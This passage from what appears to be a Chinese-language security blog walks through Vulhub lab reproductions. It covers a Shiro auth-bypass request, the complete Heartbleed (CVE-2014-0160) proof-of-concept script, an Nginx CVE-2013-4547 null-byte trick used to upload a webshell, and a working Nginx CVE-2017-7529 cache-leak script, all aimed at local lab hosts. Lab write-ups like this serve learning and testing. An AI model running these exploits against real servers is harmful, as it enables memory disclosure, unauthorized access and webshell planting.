class="line">在最早的另一个漏洞中,\*表示匹配零个或多个字符串，/\*可以匹配/hello，但匹配不到/hello/因为\*通配符无法匹配路</span><br><span class="line">径。</span><br><span class="line"></span><br><span class="line">如果我们给/hello链接设置了拦截器，访问/hello将会被进行权限判断，如果请求的URI为/hello/呢，/*URL路径表达式将无</span><br><span class="line">法正确匹配，放行。然后进入到spring(Servlet)拦截器，spring中/hello形式和/hello/形式的URL访问的资源是一样的。</span><br><span class="line">那么就实现了没有登录就越权访问了/hello目录</span><br></pre></td></tr></table></figure>

<p>这次的CVE产生于shiro在uri进拦截器之前使用了RequestUri函数中调用decodeAndCleanUriString函数对URI进行清洗。如果URI中存在;号的话，则会删除其后面的所有字符。</p>
<p>清洗函数在源码中具体实例如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">private static String decodeAndCleanUriString(HttpServletRequest request, String uri) &#123;</span><br><span class="line">      uri = decodeRequestString(request, uri);</span><br><span class="line">      int semicolonIndex = uri.indexOf(59);//获取;号的位置</span><br><span class="line">      return semicolonIndex != -1 ? uri.substring(0, semicolonIndex) : uri;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>这样,在被过滤器检查的时候类似于&#x2F;miao;&#x2F;..&#x2F;hello&#x2F;1&#x2F;最终也就变成了&#x2F;miao,而进spring之前不会被清洗,所以正常解析到&#x2F;miao;&#x2F;..&#x2F;hello&#x2F;1&#x2F;</p>
<p>所以也就知道该怎么做了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /admin HTTP/1.1</span><br><span class="line">Host: 192.168.10.129:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en;q=0.3,en-US;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure>

<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/1957%E7%A0%B4%E8%A7%A32.png" class>

<p>直接访问&#x2F;admin失败了，会被重定向到根目录</p>
<p>构造恶意请求&#x2F;xxx&#x2F;..;&#x2F;admin&#x2F;，即可绕过权限校验，访问到管理页面</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /xxx/..;/admin/ HTTP/1.1</span><br><span class="line">Host: 192.168.10.129:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en;q=0.3,en-US;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure>

<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/1957%E7%A0%B4%E8%A7%A33.jpg" class>

<p>这样就成功访问到了管理页面。</p>
<h2 id="CVE-2014-0160（OpenSSL心脏出血漏洞）"><a href="#CVE-2014-0160（OpenSSL心脏出血漏洞）" class="headerlink" title="CVE-2014-0160（OpenSSL心脏出血漏洞）"></a>CVE-2014-0160（OpenSSL心脏出血漏洞）</h2><ul>
<li><p>OpenSSL:OpenSSL是一个强大的安全套接字层密码库，Apache使用它加密HTTPS，OpenSSH使用它加密SSH。OpenSSL为网络通信提供安全及数据完整性的一种安全协议，囊括了主要的密码算法、常用的密钥和证书封装管理功能以及SSL协议，并提供了丰富的应用程序供测试或其它目的使用。</p>
</li>
<li><p>越来越多的网站使用加密代码来保护如用户名、密码和信用卡号等数据，这能够防止黑客通过网络盗取个人信息。这种加密协议被称为SSL(Secure Sockets Layer安全套接层)或TLS(Transport Layer Security Protocol安全传输层协议)。当一个网站使用这种安全协议，浏览器中的地址栏旁会出现挂锁图标。编写加密代码十分复杂，所以很多网站使用一种开源的免费安全协议，即OpenSSL。</p>
</li>
<li><p>导致此漏洞的代码在OpenSSL的TLS HeartBeat扩展中，问题存在于ssl&#x2F;dl_both.c文件中的心跳部分，具体函数为</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int dtls1_process_heartbeat(SSL *s)</span><br></pre></td></tr></table></figure>

<ul>
<li>SSLv3记录包括内容：类型域type，长度域length，数据域data。P是指向SSLv3记录中数据的指针。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">hbtype = *p++;n2s(p, payload);pl = p;</span><br><span class="line">unsigned char *buffer, *bp;int r;</span><br><span class="line">buffer = OpenSSL_malloc(1 + 2 + payload + padding);bp = buffer;</span><br><span class="line">*bp++ = TLS1_HB_RESPONSE;s2n(payload, bp);memcpy(bp, pl, payload);</span><br><span class="line"></span><br><span class="line"># 商业转载请联系作者获得授权，非商业转载请注明出处。</span><br><span class="line"># For commercial use, please contact the author for authorization. For non-commercial use, please indicate the source.</span><br><span class="line"># 协议(License)：署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0)</span><br><span class="line"># 作者(Author)：drinkflower</span><br><span class="line"># 链接(URL)：https://drinkflower.asia/wordpress/</span><br><span class="line"># 来源(Source)：drinkflower&#x27;s blog</span><br><span class="line"></span><br><span class="line">Hbtype：心跳包的类型；</span><br><span class="line">payload：心跳包的长度；</span><br><span class="line">pl：访问者提供的心跳包的数据。</span><br><span class="line">buffer：分配访问者指定大小的内存块，此内存块最大可为：[1+2+65535+16]字节；</span><br><span class="line">bp：分配内存块的指针。</span><br></pre></td></tr></table></figure>

<ul>
<li><p>先后将类型、长度存入bp指向的buffer，长度与访问者提供的长度相同，从pl复制payload长度到bp指向的buffer中。</p>
</li>
<li><p>而漏洞便发生在此处，当恶意构造的心跳包没有提供足够多的数据，且payload 的长度与实际不符，memcpy便会把SSLv3记录后的数据均复制出来，数据每次至多64KB。</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;心跳&quot;是一种常见的运维设计思想，即连接一端的计算机发出一条简短数据，协议另一端的计算机是否仍然在线，并获取反馈</span><br><span class="line">数据。由于这种用于运维的链接可能是周期性的，因此被称为心跳。Heartbleed漏洞产生条件便源于此，当构造一个恶意的心</span><br><span class="line">跳数据进行欺骗SSL协议另一端的计算机时，其便会受到欺骗并发送服务器内存中的数</span><br></pre></td></tr></table></figure>

<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/0160%E7%A0%B4%E8%A7%A3.png" class>

<p>也就是说,这个漏洞可以让我们把服务器内存中的数据一次一次的带出,每次可以带出64kb</p>
<p>此漏洞利用条件为OpenSSL1.0.1</p>
<h3 id="复现-11"><a href="#复现-11" class="headerlink" title="复现"></a>复现</h3><p>由docker ps可知https服务是开在8443端口的，访问一下，记得将请求url请求替换为htpps，因为只支持https请求</p>
<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/0160%E7%A0%B4%E8%A7%A32.png" class>

<p>对于这个漏洞的攻击就是直接用python将脚本带出，脚本如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"></span><br><span class="line"># Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)</span><br><span class="line"># The author disclaims copyright to this source code.</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line">import struct</span><br><span class="line">import socket</span><br><span class="line">import time</span><br><span class="line">import select</span><br><span class="line">import binascii</span><br><span class="line">import re</span><br><span class="line">from optparse import OptionParser</span><br><span class="line"></span><br><span class="line">options = OptionParser(usage=&#x27;%prog server [options]&#x27;, description=&#x27;Test for SSL heartbeat vulnerability (CVE-2014-0160)&#x27;)</span><br><span class="line">options.add_option(&#x27;-p&#x27;, &#x27;--port&#x27;, type=&#x27;int&#x27;, default=443, help=&#x27;TCP port to test (default: 443)&#x27;)</span><br><span class="line"></span><br><span class="line">def h2bin(x):</span><br><span class="line">    return binascii.unhexlify(x.replace(&#x27; &#x27;, &#x27;&#x27;).replace(&#x27;\n&#x27;, &#x27;&#x27;))</span><br><span class="line"></span><br><span class="line">hello = h2bin(&#x27;&#x27;&#x27;</span><br><span class="line">16 03 02 00 dc 01 00 00 d8 03 02 53</span><br><span class="line">43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf</span><br><span class="line">bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00</span><br><span class="line">00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88</span><br><span class="line">00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c</span><br><span class="line">c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09</span><br><span class="line">c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44</span><br><span class="line">c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c</span><br><span class="line">c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11</span><br><span class="line">00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04</span><br><span class="line">03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19</span><br><span class="line">00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08</span><br><span class="line">00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13</span><br><span class="line">00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00</span><br><span class="line">00 0f 00 01 01</span><br><span class="line">&#x27;&#x27;&#x27;)</span><br><span class="line"></span><br><span class="line">hb = h2bin(&#x27;&#x27;&#x27;</span><br><span class="line">18 03 02 00 03</span><br><span class="line">01 40 00</span><br><span class="line">&#x27;&#x27;&#x27;)</span><br><span class="line"></span><br><span class="line">def hexdump(s: bytes):</span><br><span class="line">    for b in range(0, len(s), 16):</span><br><span class="line">        lin = [c for c in s[b : b + 16]]</span><br><span class="line">        hxdat = &#x27; &#x27;.join(&#x27;%02X&#x27; % c for c in lin)</span><br><span class="line">        pdat = &#x27;&#x27;.join((chr(c) if 32 &lt;= c &lt;= 126 else &#x27;.&#x27; )for c in lin)</span><br><span class="line">        print(&#x27;  %04x: %-48s %s&#x27; % (b, hxdat, pdat))</span><br><span class="line"></span><br><span class="line">    print(&quot;&quot;)</span><br><span class="line"></span><br><span class="line">def recvall(s, length, timeout=5):</span><br><span class="line">    endtime = time.time() + timeout</span><br><span class="line">    rdata = b&#x27;&#x27;</span><br><span class="line">    remain = length</span><br><span class="line">    while remain &gt; 0:</span><br><span class="line">        rtime = endtime - time.time()</span><br><span class="line">        if rtime &lt; 0:</span><br><span class="line">            return None</span><br><span class="line">        r, w, e = select.select([s], [], [], 5)</span><br><span class="line">        if s in r:</span><br><span class="line">            data = s.recv(remain)</span><br><span class="line">            # EOF?</span><br><span class="line">            if not data:</span><br><span class="line">                return None</span><br><span class="line">            rdata += data</span><br><span class="line">            remain -= len(data)</span><br><span class="line">    return rdata</span><br><span class="line"></span><br><span class="line">def recvmsg(s):</span><br><span class="line">    hdr = recvall(s, 5)</span><br><span class="line">    if hdr is None:</span><br><span class="line">        print(&#x27;Unexpected EOF receiving record header - server closed connection&#x27;)</span><br><span class="line">        return None, None, None</span><br><span class="line">    typ, ver, ln = struct.unpack(&#x27;&gt;BHH&#x27;, hdr)</span><br><span class="line">    pay = recvall(s, ln, 10)</span><br><span class="line">    if pay is None:</span><br><span class="line">        print(&#x27;Unexpected EOF receiving record payload - server closed connection&#x27;)</span><br><span class="line">        return None, None, None</span><br><span class="line">    print(&#x27; ... received message: type = %d, ver = %04x, length = %d&#x27; % (typ, ver, len(pay)))</span><br><span class="line">    return typ, ver, pay</span><br><span class="line"></span><br><span class="line">def hit_hb(s):</span><br><span class="line">    s.send(hb)</span><br><span class="line">    while True:</span><br><span class="line">        typ, ver, pay = recvmsg(s)</span><br><span class="line">        if typ is None:</span><br><span class="line">            print(&#x27;No heartbeat response received, server likely not vulnerable&#x27;)</span><br><span class="line">            return False</span><br><span class="line"></span><br><span class="line">        if typ == 24:</span><br><span class="line">            print(&#x27;Received heartbeat response:&#x27;)</span><br><span class="line">            hexdump(pay)</span><br><span class="line">            if len(pay) &gt; 3:</span><br><span class="line">                print(&#x27;WARNING: server returned more data than it should - server is vulnerable!&#x27;)</span><br><span class="line">            else:</span><br><span class="line">                print(&#x27;Server processed malformed heartbeat, but did not return any extra data.&#x27;)</span><br><span class="line">            return True</span><br><span class="line"></span><br><span class="line">        if typ == 21:</span><br><span class="line">            print(&#x27;Received alert:&#x27;)</span><br><span class="line">            hexdump(pay)</span><br><span class="line">            print(&#x27;Server returned error, likely not vulnerable&#x27;)</span><br><span class="line">            return False</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    opts, args = options.parse_args()</span><br><span class="line">    if len(args) &lt; 1:</span><br><span class="line">        options.print_help()</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    print(&#x27;Connecting...&#x27;)</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line">    s.connect((args[0], opts.port))</span><br><span class="line">    print(&#x27;Sending Client Hello...&#x27;)</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line">    s.send(hello)</span><br><span class="line">    print(&#x27;Waiting for Server Hello...&#x27;)</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line">    while True:</span><br><span class="line">        typ, ver, pay = recvmsg(s)</span><br><span class="line">        if typ == None:</span><br><span class="line">            print(&#x27;Server closed connection without sending Server Hello.&#x27;)</span><br><span class="line">            return</span><br><span class="line">        # Look for server hello done message.</span><br><span class="line">        if typ == 22 and pay[0] == 0x0E:</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">    print(&#x27;Sending heartbeat request...&#x27;)</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line">    s.send(hb)</span><br><span class="line">    hit_hb(s)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>再使用命令运行脚本：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python seb.py 127.0.0.1 -p 8443</span><br></pre></td></tr></table></figure>

<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/0160%E7%A0%B4%E8%A7%A33.png" class>

<p>数据被成功带出</p>
<h4 id="法2-1"><a href="#法2-1" class="headerlink" title="法2"></a>法2</h4><p>也可以直接使用msf里的漏洞模块，直接进行攻击，就是程序化的，这里就不再对这个方法做详细的介绍了</p>
<h2 id="CVE-2013-4547（Nginx文件名逻辑漏洞）"><a href="#CVE-2013-4547（Nginx文件名逻辑漏洞）" class="headerlink" title="CVE-2013-4547（Nginx文件名逻辑漏洞）"></a>CVE-2013-4547（Nginx文件名逻辑漏洞）</h2><p>之前的CVE几乎都是关于Apache的，所以这里就对Nginx做一个解释</p>
<ul>
<li><p>Nginx（发音为“engine-x”）是一个高性能的开源Web服务器软件。它以异步事件驱动的方式处理客户端请求，具有占用资源 少、处理并发连接能力强和稳定性高等特点。Nginx还可以用作反向代理服务器、负载均衡器和HTTP缓存等。</p>
</li>
<li><p>Nginx与Apache相比，有以下的一些区别：</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.架构设计：Nginx采用了基于事件驱动的架构，而Apache采用的是多线程或多进程的模型。这使得Nginx在处理大量并发连接时更高效，内存消耗更少。</span><br><span class="line"></span><br><span class="line">2.内存使用：Nginx设计得非常轻量级，内存占用量较低。相比之下，Apache使用的线程模型会为每个连接创建一个线程或进程，导致内存消耗较高。</span><br><span class="line"></span><br><span class="line">3.静态文件处理：Nginx在处理静态文件时效率更高，可以更快地提供静态内容。Apache在这方面的性能相对较差。</span><br><span class="line"></span><br><span class="line">4.可扩展性：Nginx具有良好的可扩展性，可以处理数千个并发连接而不会影响性能。Apache则对并发连接的处理能力相对较弱。</span><br></pre></td></tr></table></figure>

<p>正常情况下（关闭pathinfo的情况下），只有.php后缀的文件才会被发送给fastcgi解析。Nginx匹配到.php结尾的请求，就发送给fastcgi进行解析，常见的写法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">location ~ \.php$ &#123;</span><br><span class="line">    include        fastcgi_params;</span><br><span class="line"></span><br><span class="line">    fastcgi_pass   127.0.0.1:9000;</span><br><span class="line">    fastcgi_index  index.php;</span><br><span class="line">    fastcgi_param  SCRIPT_FILENAME  /var/www/html$fastcgi_script_name;</span><br><span class="line">    fastcgi_param  DOCUMENT_ROOT /var/www/html;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中,送入的文件名会被交给.php$这个正则处理,如果满足就被送入location,不满足就丢给别的模块处理</p>
<p>在存在CVE-2013-4547的情况下，我们请求1.gif[0x20][0x00].php，这个URI可以匹配上正则.php$，可以进入这个Location块；但进入后，0x00截至符把后面的内容屏蔽了,Nginx就错误地认为请求的文件是1.gif[0x20]，就设置其为SCRIPT_FILENAME的值发送给fastcgi。fastcgi根据SCRIPT_FILENAME的值进行解析，然后后续所有针对文件名的过滤就都失效了. 漏洞的利用条件是nginx版本在 0.8.41～1.4.3， 1.5 ~ 1.5.7 漏洞复现</p>
<p>漏洞的利用条件是nginx版本在0.8.41<del>1.4.3，1.5</del>1.5.7</p>
<h3 id="复现-12"><a href="#复现-12" class="headerlink" title="复现"></a>复现</h3><img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/4547%E7%A0%B4%E8%A7%A3.png" class>

<ul>
<li><p>在该漏洞中，非法字符空格和截止符（\0）可能会导致 Nginx 在解析 URI 时的有限状态机（Finite State Machine）出现混乱。有限状态机是一种计算模型，用于描述具有有限数量状态和规则转换的系统。在 Nginx 中，有限状态机用于解析和处理客户端请求。 </p>
</li>
<li><p>举个例子来说明：假设服务器上存在一个文件名为 “file.aaa “，注意文件名的最后一个字符是空格。在正常情况下，当我们使用 URI 访问该文件时，应该是：”<a href="http://example.com/file.aaa">http://example.com/file.aaa</a> “。然而，在存在该漏洞的情况下，攻击者可以通过构造特殊的请求来绕过 URI 后缀名限制。 </p>
</li>
<li><p>例如，攻击者可以发送一个请求：”<a href="http://example.com/file.aaa">http://example.com/file.aaa</a> \0.bbb”。这里 “%20” 是 URL 编码表示的空格字符。由于有限状态机在解析 URI 时无法正确处理空格字符，Nginx 可能会误认为请求的文件后缀是 “.bbb “，而忽略了空格前的内容。这样，攻击者就能够绕过原本的后缀名限制，访问到服务器上的文件。</p>
</li>
</ul>
<p>先上传一个木马文件试试</p>
<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/4547%E7%A0%B4%E8%A7%A32.png" class>

<p>这里能看到访问失败了，根据这个漏洞的原理，我们抓包在16进制编辑器里面插入16进制的20和00就行</p>
<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/4547%E7%A0%B4%E8%A7%A33.png" class>

<p>可以看到上传成功，尝试用蚁剑连接</p>
<p>蚁剑连接失败，不知道是为啥，这里就不管了，不过修改木马文件内容为phpinfo()是可以看到有关php的相关信息的。</p>
<h2 id="CVE-2017-7529（Nginx越界读取缓存漏洞）"><a href="#CVE-2017-7529（Nginx越界读取缓存漏洞）" class="headerlink" title="CVE-2017-7529（Nginx越界读取缓存漏洞）"></a>CVE-2017-7529（Nginx越界读取缓存漏洞）</h2><ul>
<li>HTTP 断点续传是一种机制，允许客户端在下载或上传大型文件时能够在中断和恢复的情况下继续传输文件，而无需重新开始整个传输过程。Range 头字段是用于实现断点续传的关键。</li>
<li>Range 头字段用于指定客户端希望从服务器端获取的资源的特定范围。它的格式为 Range: bytes&#x3D;start-end，其中 start 是起始字节位置，end是结束字节位置（可选）。</li>
<li>当客户端发送带有 Range 头的请求时，服务器会根据该范围返回相应的文件片段。这使得客户端可以通过多次发送请求来逐步下载整个文件，或者在下载过程中暂停并继续下载。</li>
<li>以下是使用 Range 头实现断点续传的示例：</li>
</ul>
<p>客户端发起带有Range头的GET请求：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Copy CodeGET /path/to/file HTTP/1.1</span><br><span class="line">Host: example.com</span><br><span class="line">Range: bytes=0-99</span><br></pre></td></tr></table></figure>

<p>服务器相应带有指定范围的内容：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Copy CodeHTTP/1.1 206 Partial Content</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line">Content-Length: 1000</span><br><span class="line">Content-Range: bytes 0-999/2000</span><br><span class="line"></span><br><span class="line">&lt;file_bytes&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>注意，服务器的响应状态码是 206 Partial Content，并且响应头中包含了 Content-Range 字段，指示服务器返回的数据范围。客户端接收到响应后，可以将获取的文件片段保存到本地文件中。</li>
<li>如果客户端在后续请求中需要继续传输文件的其他部分，只需更新 Range 头字段的范围，再次发送带有 Range 头的 GET 请求。</li>
</ul>
<h3 id="复现-13"><a href="#复现-13" class="headerlink" title="复现"></a>复现</h3><p>首先访问一下8080端口的服务</p>
<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/7529%E7%A0%B4%E8%A7%A3.png" class>

<p>当用户发起请求时，Nginx会先检查是否有与请求匹配的缓存文件存在。如果存在缓存文件并且命中了请求，则不需要再次访问后端服务器，Nginx会直接从缓存文件中读取HTTP返回包体，并将其返回给用户。这节省了从后端服务器获取数据的时间，提高了响应速度和性能。 </p>
<p>缓存的文件通常包含文件头、HTTP返回包头和HTTP返回包体。文件头包含了额外的信息，例如缓存的创建时间和过期时间等。HTTP返回包头则包含了原始服务器返回的响应头部信息，例如状态码、内容类型、缓存策略等。而HTTP返回包体则是服务器返回的实际内容，比如网页的HTML代码或者静态文件的二进制数据。 </p>
<p>如果我的请求中包含Range头，Nginx将会根据我指定的start和end位置，返回指定长度的内容。而如果我构造了两个负的位置，如(-600, -9223372036854774591)，将可能读取到负位置的数据。如果这次请求又命中了缓存文件，则可能就可以读取到缓存文件中位于“HTTP返回包体”前的“文件头”、“HTTP返回包头”等内容。这样就实现了读了别的请求的缓存文件,相当于获取了别人的请求内容.</p>
<p>直接用脚本打</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">import sys</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">if len(sys.argv) &lt; 2:</span><br><span class="line">    print(&quot;%s url&quot; % (sys.argv[0]))</span><br><span class="line">    print(&quot;eg: python %s http://your-ip:8080/&quot; % (sys.argv[0]))</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    &#x27;User-Agent&#x27;: &quot;Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240&quot;</span><br><span class="line">&#125;</span><br><span class="line">offset = 605</span><br><span class="line">url = sys.argv[1]</span><br><span class="line">file_len = len(requests.get(url, headers=headers).content)</span><br><span class="line">n = file_len + offset</span><br><span class="line">headers[&#x27;Range&#x27;] = &quot;bytes=-%d,-%d&quot; % (</span><br><span class="line">    n, 0x8000000000000000 - n)</span><br><span class="line"></span><br><span class="line">r = requests.get(url, headers=headers)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python 1.py http://192.168.10.129:8080/</span><br></pre></td></tr></table></figure>

<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/7529%E7%A0%B4%E8%A7%A32.png" class>

<p>成功读取缓存</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

